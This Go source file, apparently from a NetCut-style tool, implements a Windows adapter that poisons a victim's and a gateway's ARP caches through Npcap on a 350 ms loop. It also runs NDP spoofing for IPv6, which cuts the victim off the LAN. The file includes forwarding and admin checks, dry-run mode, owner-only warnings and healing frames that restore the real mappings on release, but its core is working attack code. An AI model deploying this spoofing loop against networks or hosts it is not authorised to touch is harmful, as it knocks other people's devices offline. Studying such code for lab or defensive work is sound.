//go:build windows

package adapters

import (
	"context"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/open-netcut/open-netcut/pkg/discovery"
	"github.com/open-netcut/open-netcut/pkg/models"
)

// WindowsSideHostAdapter implements side-host ARP quarantine on Windows.
//
// Poison path: Npcap injects forged ARP frames (victim told gateway-IP is at
// our MAC; gateway told victim-IP is at our MAC) on a ~350ms loop, mirroring
// the Linux l2_arp adapter. Attracted traffic is NOT forwarded — Windows IP
// forwarding must be off, which Apply verifies and refuses otherwise.
// Release path: loop stops, genuine-MAC healing frames are broadcast, then
// the Npcap handle closes.
//
// Safety: explicit adapter selection only, allowlist enforced by the policy
// engine, TTL auto-release, audit trail. Use only on networks you own.
type WindowsSideHostAdapter struct {
	mu     sync.Mutex
	active map[string]*windowsCut // target IP -> live cut
}

type windowsCut struct {
	stop        chan struct{}
	done        chan struct{}
	handle      uintptr
	stopOnce    sync.Once
	workers     sync.WaitGroup
	gwIP        net.IP
	gwMAC       net.HardwareAddr
	targetIP    net.IP
	targetMAC   net.HardwareAddr
	victimIPv6  []net.IP
	gatewayIPv6 []net.IP
	send        func([]byte) error
	closeHandle func()
}

// NewWindowsSideHostAdapter creates the adapter (no I/O; devices open lazily
// per enforcement so multi-homed hosts pick the right interface per cut).
func NewWindowsSideHostAdapter() *WindowsSideHostAdapter {
	return &WindowsSideHostAdapter{active: make(map[string]*windowsCut)}
}

func (a *WindowsSideHostAdapter) Name() string { return "windows_sidehost" }

func (a *WindowsSideHostAdapter) Capabilities() []string {
	return []string{"quarantine", "dry_run"}
}

func (a *WindowsSideHostAdapter) Describe() AdapterInfo {
	return AdapterInfo{
		Name:  "windows_sidehost",
		Label: "Windows Side-Host — ARP quarantine",
		Kind:  KindLab, Effectiveness: 4,
		Capabilities:       a.Capabilities(),
		RecommendedWhen:    "Windows PC on an unmanaged LAN (this box is NOT the gateway).",
		Requires:           "Administrator + Npcap + IP forwarding OFF.",
		Description:        "ARP enforcement: poison victim and gateway caches; attracted traffic dies here instead of being forwarded.",
		Warning:            "Use only on networks you own. Disruptive by design.",
		LabOnly:            true,
		SupportsQuarantine: true, SupportsShaping: false,
	}
}

// IsAvailable reports whether this host can enforce right now: Npcap present
// and IP forwarding off. Admin rights are checked at Apply time with a clear
// error (opening the dashboard must never require elevation by itself).
func (a *WindowsSideHostAdapter) IsAvailable(_ context.Context) bool {
	if !npcapAvailable() {
		return false
	}
	fwd, err := windowsForwardingEnabled()
	return err == nil && !fwd
}

func windowsIsAdmin() bool {
	return exec.Command("net", "session").Run() == nil
}

// windowsForwardingEnabled reads the IPEnableRouter flag. Absent/unreadable
// is treated as an error (refuse rather than assume) except when the value is
// confirmed 0.
func windowsForwardingEnabled() (bool, error) {
	out, err := exec.Command("reg", "query",
		`HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters`,
		"/v", "IPEnableRouter").CombinedOutput()
	if err != nil {
		// Value absent means default (disabled) — but only if reg itself ran.
		if strings.Contains(strings.ToLower(string(out)), "unable to find") ||
			strings.Contains(strings.ToLower(string(out)), "error: the system was unable to find") {
			return false, nil
		}
		return false, fmt.Errorf("cannot verify IP forwarding state: %v", err)
	}
	return parseIPEnableRouter(string(out))
}

// WindowsForwardingState exposes the same fail-closed check used by quarantine
// so the helper's readiness report cannot disagree with enforcement.
func WindowsForwardingState() (bool, error) {
	return windowsForwardingEnabled()
}

func (a *WindowsSideHostAdapter) ApplyQuarantine(ctx context.Context, e *models.Enforcement) error {
	if e.DryRun {
		now := time.Now().UTC()
		e.AppliedAt = &now
		e.ActualState = models.StateApplied
		return nil
	}

	targetIP := net.ParseIP(strings.TrimSpace(e.TargetIP))
	if targetIP == nil || targetIP.To4() == nil {
		return fmt.Errorf("target IP %q is not valid IPv4", e.TargetIP)
	}
	targetMAC, err := net.ParseMAC(strings.TrimSpace(e.TargetMAC))
	if err != nil {
		return fmt.Errorf("invalid target MAC %q: %w", e.TargetMAC, err)
	}
	if !windowsIsAdmin() {
		return fmt.Errorf("administrator rights required (run elevated); Npcap injection is privileged")
	}
	if fwd, err := windowsForwardingEnabled(); err != nil {
		return fmt.Errorf("refusing cut: %v", err)
	} else if fwd {
		return fmt.Errorf("refusing cut: IP forwarding is ON — this host would route victim traffic instead of dropping it (set IPEnableRouter=0)")
	}
	gwIPStr, gwMACStr, err := discovery.GetDefaultGateway(ctx)
	if err != nil || gwIPStr == "" || gwMACStr == "" {
		return fmt.Errorf("refusing cut: default gateway IP/MAC not resolvable (%v)", err)
	}
	gwIP := net.ParseIP(gwIPStr)
	gwMAC, err := net.ParseMAC(gwMACStr)
	if err != nil {
		return fmt.Errorf("refusing cut: bad gateway MAC %q", gwMACStr)
	}

	devices, err := npcapIPv4Devices()
	if err != nil {
		return fmt.Errorf("refusing cut: %v (install Npcap)", err)
	}
	locals, err := localIPv4Interfaces()
	if err != nil {
		return fmt.Errorf("refusing cut: enumerate local LAN interfaces: %w", err)
	}
	devName, _, hostMAC, err := selectLocalDevice(devices, locals, gwIPStr, targetIP.String())
	if err != nil {
		return fmt.Errorf("refusing cut: %v", err)
	}
	handle, err := npcapOpen(devName)
	if err != nil {
		return fmt.Errorf("refusing cut: %v", err)
	}

	a.mu.Lock()
	if old, ok := a.active[targetIP.String()]; ok {
		old.stopOnce.Do(func() { close(old.stop) })
		<-old.done
		old.closeHandle()
		delete(a.active, targetIP.String())
	}
	stop := make(chan struct{})
	done := make(chan struct{})
	cut := &windowsCut{stop: stop, done: done, handle: handle,
		gwIP: gwIP, gwMAC: gwMAC, targetIP: targetIP, targetMAC: targetMAC,
		send:        func(frame []byte) error { return npcapSend(handle, frame) },
		closeHandle: func() { npcapClose(handle) },
	}
	// Save the genuine endpoints before poisoning, including any IPv6 pairing.
	cut.victimIPv6 = windowsNDPAddrs(ctx, targetMAC)
	if len(cut.victimIPv6) > 0 {
		cut.gatewayIPv6 = windowsNDPAddrs(ctx, gwMAC)
	}
	cut.workers.Add(1)
	if len(cut.victimIPv6) > 0 && len(cut.gatewayIPv6) > 0 {
		cut.workers.Add(1)
	}
	a.active[targetIP.String()] = cut
	a.mu.Unlock()

	go func() {
		defer cut.workers.Done()
		ticker := time.NewTicker(350 * time.Millisecond)
		defer ticker.Stop()
		send := func() {
			// Victim: gateway IP is at our MAC.
			for _, op := range []uint16{2, 1} {
				if f, err := buildARPFrame(op, hostMAC, targetMAC, hostMAC, gwIP, targetMAC, targetIP); err == nil {
					_ = npcapSend(handle, f)
				}
			}
			// Gateway: victim IP is at our MAC.
			for _, op := range []uint16{2, 1} {
				if f, err := buildARPFrame(op, hostMAC, gwMAC, hostMAC, targetIP, gwMAC, gwIP); err == nil {
					_ = npcapSend(handle, f)
				}
			}
		}
		for i := 0; i < 4; i++ { // initial burst
			select {
			case <-stop:
				return
			default:
				send()
			}
		}
		for {
			select {
			case <-stop:
				return
			case <-ticker.C:
				send()
			}
		}
	}()

	// Pair the v4 cut with NDP spoofing when both sides have IPv6 neighbor
	// addresses; otherwise dual-stack victims stay online over v6.
	// Best effort: v4 enforcement stands regardless.
	if len(cut.victimIPv6) > 0 && len(cut.gatewayIPv6) > 0 {
		go func() {
			defer cut.workers.Done()
			runNAStorm(stop, func(_ net.HardwareAddr, f []byte) {
				_ = cut.send(f)
			}, hostMAC, targetMAC, gwMAC, cut.victimIPv6, cut.gatewayIPv6, true)
		}()
	}
	go func() { cut.workers.Wait(); close(done) }()

	now := time.Now().UTC()
	e.AppliedAt = &now
	e.ActualState = models.StateApplied
	return nil
}

func (a *WindowsSideHostAdapter) RemoveQuarantine(_ context.Context, e *models.Enforcement) error {
	if e.DryRun {
		e.ActualState = models.StateRolledBack
		return nil
	}
	a.mu.Lock()
	defer a.mu.Unlock()
	cut, ok := a.active[strings.TrimSpace(e.TargetIP)]
	if !ok {
		now := time.Now().UTC()
		e.AppliedAt = &now
		e.ActualState = models.StateRolledBack
		return nil
	}
	cut.stopOnce.Do(func() { close(cut.stop) })
	<-cut.done
	// Wait for BOTH poison loops, then restore the saved genuine mappings.
	// A fresh gateway lookup during release could use a changed route/cache.
	frames := healingFrames(cut.gwIP, cut.gwMAC, cut.targetIP, cut.targetMAC)
	if len(frames) == 0 {
		return fmt.Errorf("release failed: genuine ARP endpoints unavailable")
	}
	frames = append(frames, healingNAFrames(cut.gatewayIPv6, cut.gwMAC, cut.victimIPv6, cut.targetMAC)...)
	var sendErr error
	for round := 0; round < healRounds; round++ {
		for _, hp := range frames {
			if err := cut.send(hp.frame); err != nil {
				sendErr = err
			}
		}
		if round+1 < healRounds {
			time.Sleep(healInterval)
		}
	}
	if sendErr != nil {
		// Retain the stopped session and open handle so restoration can retry.
		return fmt.Errorf("release failed while sending healing frames: %w", sendErr)
	}
	cut.closeHandle()
	delete(a.active, strings.TrimSpace(e.TargetIP))

	now := time.Now().UTC()
	e.AppliedAt = &now
	e.ActualState = models.StateRolledBack
	return nil
}

func (a *WindowsSideHostAdapter) ApplyRateLimit(_ context.Context, _ *models.Enforcement) error {
	return fmt.Errorf("windows rate limiting is not implemented yet (gateway tc only)")
}

func (a *WindowsSideHostAdapter) RemoveRateLimit(_ context.Context, e *models.Enforcement) error {
	now := time.Now().UTC()
	e.AppliedAt = &now
	e.ActualState = models.StateRolledBack
	return nil
}
